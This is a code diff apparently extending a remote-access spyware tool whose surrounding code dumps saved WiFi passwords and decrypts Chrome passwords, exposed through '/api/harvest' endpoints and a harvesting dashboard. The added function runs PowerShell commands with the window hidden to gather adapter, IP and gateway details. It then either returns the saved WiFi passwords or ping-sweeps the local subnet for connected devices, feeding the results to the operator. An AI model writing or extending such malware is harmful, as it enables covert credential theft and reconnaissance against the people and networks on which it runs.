@@ -742,6 +742,57 @@ def _dump_wifi_passwords() -> list:
         pass
     return results
 
+def _get_network_info() -> dict:
+    """Detect network type (WiFi/Ethernet), get adapter info, and scan LAN for connected devices."""
+    info = {'type': 'unknown', 'adapter': '', 'ip': '', 'gateway': '', 'wifi_profiles': [], 'lan_devices': []}
+    try:
+        adapt = subprocess.run(
+            ['powershell', '-Command',
+             'Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object Name, InterfaceDescription, LinkSpeed | Format-List'],
+            capture_output=True, text=True, timeout=15, creationflags=0x08000000
+        )
+        adapter_text = adapt.stdout.strip()
+        info['adapter'] = adapter_text
+        if 'Wi-Fi' in adapter_text or 'Wireless' in adapter_text or '802.11' in adapter_text:
+            info['type'] = 'wifi'
+        elif 'Ethernet' in adapter_text or 'LAN' in adapter_text or 'Realtek' in adapter_text or 'Intel' in adapter_text:
+            info['type'] = 'ethernet'
+    except:
+        pass
+    try:
+        ip_res = subprocess.run(
+            ['powershell', '-Command',
+             '(Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null}).IPv4Address.IPAddress'],
+            capture_output=True, text=True, timeout=10, creationflags=0x08000000
+        )
+        info['ip'] = ip_res.stdout.strip()
+    except:
+        pass
+    try:
+        gw_res = subprocess.run(
+            ['powershell', '-Command',
+             '(Get-NetIPConfiguration).IPv4DefaultGateway.NextHop'],
+            capture_output=True, text=True, timeout=10, creationflags=0x08000000
+        )
+        info['gateway'] = gw_res.stdout.strip().split('\n')[0].strip()
+    except:
+        pass
+    if info['type'] == 'wifi':
+        info['wifi_profiles'] = _dump_wifi_passwords()
+    if info['type'] == 'ethernet' and info['ip']:
+        try:
+            subnet = '.'.join(info['ip'].split('.')[:3]) + '.'
+            scan_res = subprocess.run(
+                ['powershell', '-Command',
+                 f'1..254 | ForEach-Object {{ $ping = Test-Connection -TargetName {subnet}$_ -Count 1 -Quiet -TimeoutSeconds 1; if ($ping) {{ "{subnet}$_" }} }}'],
+                capture_output=True, text=True, timeout=120, creationflags=0x08000000
+            )
+            devices = [l.strip() for l in scan_res.stdout.strip().split('\n') if l.strip()]
+            info['lan_devices'] = devices[:50]
+        except:
+            pass
+    return info
+
 def _decrypt_chrome_passwords() -> list:
     """Decrypt Chrome saved passwords."""
     results = []
@@ -2388,11 +2439,24 @@ DASHBOARD_HTML = r'''
 
         // ===== HARVEST =====
         async function harvestWifi() {
-            document.getElementById('wifiBox').textContent = 'Extracting...';
+            document.getElementById('wifiBox').textContent = 'Scanning...';
             const res = await fetch('/api/harvest/wifi');
             const data = await res.json();
-            document.getElementById('wifiBox').textContent = data.passwords ? data.passwords.join('\n') : 'None found';
-            logActivity('WiFi passwords dumped');
+            let out = '';
+            out += 'Type: ' + (data.type || '?').toUpperCase() + '\n';
+            out += 'IP: ' + (data.ip || '?') + '\n';
+            out += 'Gateway: ' + (data.gateway || '?') + '\n';
+            if (data.adapter) out += '\n' + data.adapter + '\n';
+            if (data.type === 'wifi' && data.passwords && data.passwords.length) {
+                out += '\n-- WiFi Profiles --\n';
+                out += data.passwords.join('\n');
+            }
+            if (data.type === 'ethernet' && data.lan_devices && data.lan_devices.length) {
+                out += '\n-- LAN Devices (' + data.lan_devices.length + ') --\n';
+                out += data.lan_devices.join('\n');
+            }
+            document.getElementById('wifiBox').textContent = out || 'No data';
+            logActivity('Network info dumped (' + data.type + ')');
         }
         async function harvestChrome() {
             document.getElementById('chromeBox').textContent = 'Decrypting...';
@@ -3488,10 +3552,10 @@ def upload_file():
 
 @app.route('/api/harvest/wifi')
 def harvest_wifi():
-    """Dump all saved WiFi passwords."""
+    """Dump network info: WiFi passwords, ethernet detection, LAN devices."""
     try:
-        passwords = _dump_wifi_passwords()
-        return jsonify({'success': True, 'passwords': passwords})
+        info = _get_network_info()
+        return jsonify({'success': True, 'type': info['type'], 'adapter': info['adapter'], 'ip': info['ip'], 'gateway': info['gateway'], 'passwords': info['wifi_profiles'], 'lan_devices': info['lan_devices']})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
